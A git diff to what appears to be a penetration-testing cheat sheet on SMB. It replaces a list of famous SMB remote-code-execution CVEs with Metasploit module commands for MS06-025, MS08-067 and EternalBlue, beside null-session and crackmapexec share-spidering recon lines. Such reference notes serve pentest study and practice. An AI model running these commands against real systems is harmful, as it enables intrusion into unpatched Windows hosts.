@@ -1,10 +1,5 @@
 ## Server Message Block
 
-* MS06-025 - RCE vulnerability.
-* MS08-067 / CVE-2008-4250 - RCE vulnerability exploited by the Conficker worm.
-* MS17-010 / CVE-2017-0144 - RCE vulnerability allegedly leaked from the NSA.
-
-
 ### Recon
 
 ```
@@ -43,3 +38,8 @@ smbclient //[ip]/[share name] -N  #Null authentication
 crackmapexec smb 10.10.11.222 -u [username] -p '' -M spider_plus #spider_plus module will run through all the shares and collect data about all the files
 ```
 
+### CVEs - MSFCONSOLE
+
+msf > use exploit/windows/smb/ms06_025_rasmans_reg     # Vulnerable: Windows RRAS / RASMAN service (older Windows XP/2000/2003 systems)
+msf > use exploit/windows/smb/ms08_067_netapi          # Vulnerable: Windows Server service on unpatched Windows XP/Vista/Server 2003/2008
+msf > use exploit/windows/smb/ms17_010_eternalblue     # Vulnerable: SMBv1 on unpatched Windows 7/Server 2008 R2 and related systems
